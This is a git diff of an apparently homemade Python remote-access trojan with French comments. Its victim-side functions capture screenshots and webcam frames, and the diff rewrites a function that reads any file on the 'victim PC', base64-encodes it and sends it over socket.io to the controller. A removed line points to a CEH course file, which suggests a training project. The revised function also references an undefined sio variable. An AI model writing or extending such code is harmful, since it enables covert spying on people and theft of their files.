@@ -10,6 +10,7 @@ import pyaudio
 import pyautogui
 import pyperclip
 from PIL import Image
+from requests import get
 
 
 def take_and_send_screenshot(sio):
@@ -125,21 +126,18 @@ def gen_frames(sio):
         cv2.destroyAllWindows()
 
 
-#Télécharger des fichiers depuis le pc victime
-def download_file(file_path, sio):
+#On dois pouvoir se balader dans les fichier de la victime pour télécharger un fichier donner
+def download_file(file_path):
     try:
-        if not os.path.isfile(file_path):
-            raise Exception(f"Le fichier n'existe pas: {file_path}")
-
-        with open(file_path, 'rb') as file:
-            file_data = file.read()
-            file_encoded = base64.b64encode(file_data).decode()
-            sio.emit('pc_victim_response', {'file': file_encoded})
-            print("Fichier envoyé")
+        # Ensure file_path is a string and correct path separators
+        file_path = file_path.replace('/', '\\')
+        if os.path.exists(file_path):
+            with open(file_path, 'rb') as file:
+                file_data = file.read()
+                file_encoded = base64.b64encode(file_data).decode()
+                sio.emit('file_response', {'file': file_encoded, 'file_name': os.path.basename(file_path)})
+                print("Fichier envoyé")
+        else:
+            print("Fichier introuvable")
     except Exception as e:
         print(f"Échec de l'envoi du fichier: {e}")
-
-
-# Chemin à ajouter
-file_path = r'C:\Users\makad\OneDrive\Documents\CEH\Cours.pdf'
-
